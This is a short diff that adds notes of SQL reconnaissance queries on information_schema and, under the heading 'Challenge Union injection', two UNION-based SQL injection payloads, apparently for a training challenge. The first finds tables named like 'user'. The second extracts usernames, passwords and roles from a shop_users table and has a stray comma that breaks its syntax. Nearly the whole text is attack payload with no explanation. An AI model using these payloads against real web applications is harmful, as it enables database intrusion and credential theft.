@@ -1,0 +1,6 @@
+select TABLE_NAME, TABLE_SCHEMA from information_schema.tables;
+select TABLE_NAME, COLUMN_NAME from information_schema.columns;
+select version(), user();
+Challenge Union injection:
+' union select 10, 20, table_schema, table_name, column_name from information_schema.columns where table_name like '%user%';--
+' union select 10, 20, username, password, role, from cyber.shop_users;--
